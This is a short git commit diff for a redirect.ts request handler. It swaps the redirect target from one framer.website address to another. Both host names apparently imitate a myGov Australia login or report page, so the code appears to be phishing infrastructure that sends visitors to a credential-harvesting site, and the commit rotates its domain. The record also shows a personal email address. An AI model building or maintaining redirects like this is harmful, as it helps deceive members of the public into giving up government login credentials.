f058ab5b379154b11fa48900156d55dcf6cebdab
deleole <oluwaryan21@gmail.com>
2025-11-17 02:52:01 +0000

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://loginmygovaureportexeato.framer.website"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://reportexeatomygoveexes44frf4.framer.website/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
